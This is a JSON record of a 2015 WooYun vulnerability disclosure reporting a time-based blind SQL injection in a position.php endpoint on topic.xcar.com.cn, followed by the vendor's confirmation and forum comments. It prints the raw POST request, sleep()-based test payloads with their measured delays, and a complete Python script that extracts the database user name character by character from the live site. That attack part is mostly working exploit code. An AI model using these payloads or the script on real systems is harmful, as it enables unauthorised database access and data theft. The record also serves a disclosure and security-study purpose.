{"id": 30480, "wybug_id": "wooyun-2015-0110875", "wybug_title": "爱卡某站SQL注射漏洞", "wybug_corp": "爱卡汽车网", "wybug_author": "紫霞仙子", "wybug_date": "2015-04-28 16:50", "wybug_open_date": "2015-06-12 17:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-12：\t细节向公众公开  简要描述： 233 详细说明：  \nurl:POST /201503/new_crown/position.php HTTP/1.1Content-Length: 143Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://topic.xcar.com.cn/201503/new_crown/Host: topic.xcar.com.cnConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.0 Safari/537.36Accept: */*position=\n   漏洞证明：  \n测试payload position=if(now()=sysdate(),sleep(3),0)  ----> 4sposition=if(now()=sysdate(),sleep(6),0)  ----> 6s position=if(now()=sysdate(),sleep(9),0)  ----> 9s确认漏洞存在。\n有点慢，不全跑了。\n\n下来看脚本：这次不要说我的脚本写的不好了。\n#!/usr/bin/pythonimport httplibimport timeimport urllibimport urllib2import sysimport randompayloads = list('abcdefghijklmnopqrstuvwxyz0123456789@_.')base_url = \"/201503/new_crown/position.php\"user = ''def sql():    global user    post_data={\"position\":\"1\"}    for i in range(1,22):        for payload in payloads:            data2 = \"if(now()=sysdate(),sleep(abs(ascii(mid(lower(user()),%d,1))-%d)),0)\" % (i,ord(payload))            post_data[\"position\"] = data2             print \tpost_data[\"position\"]\t\t                data=urllib.urlencode(post_data)            headers = {\"User-agent\":\"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0\",               \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\",               \"Accept-Language\" : \"zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3\",               \"Accept-Encoding\" : \"gzip, deflate\",               \"Content-Type\": \"application/x-www-form-urlencoded\",               \"Connection\": \"keep-alive\"}            try:\t\t              now_time = time.time()              conn = httplib.HTTPConnection(\"topic.xcar.com.cn\",timeout=60)              conn.request('POST', base_url, data, headers)              data3 = conn.getresponse().read()            except:                continue                print i                if time.time() - now_time < 1:                user += payload                sys.stdout.write('\\r[In Progress]' + user +'\\n')                sys.stdout.flush()                break            else:                print \"pass\"if __name__ == \"__main__\":    sql()    print '\\n[Done]MySQL user is ' + user\n   修复方案：  ～～求　２０　rank !!!   版权声明：转载请注明来源 紫霞仙子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2015-04-28 17:10 厂商回复： 感谢@紫霞仙子的提交，我们会尽快处理！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-28 16:54 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  CBSi这几个站你盯的挺紧吖    \n     2015-04-28 16:56 |    \t\t紫霞仙子 \t\t\t( 普通白帽子  |\t\t\t        Rank:2027 漏洞数:279        | 天天向上 ！！！)\t\t \n  @浩天 哈哈，天天盯着也很累啊！    \n     2015-04-28 17:18 |    \t\t紫霞仙子 \t\t\t( 普通白帽子  |\t\t\t        Rank:2027 漏洞数:279        | 天天向上 ！！！)\t\t \n  @浩天 其实是肉肉给我说的，做人要专一。@肉肉    \n     2015-04-28 20:45 |    \t\t肉肉  \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:10        | 肉肉在长亭科技，肉肉在长亭科技，肉肉在长...)\t\t \n  @紫霞仙子 啊？什么？    \n     2015-04-28 20:46 |    \t\t紫霞仙子 \t\t\t( 普通白帽子  |\t\t\t        Rank:2027 漏洞数:279        | 天天向上 ！！！)\t\t \n  @肉肉 肉肉    \n     2015-05-31 22:52 |    \t\tManning \t\t\t( 普通白帽子  |\t\t\t        Rank:559 漏洞数:78        | 就恨自己服务器太少)\t\t \n  玩出花儿来了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}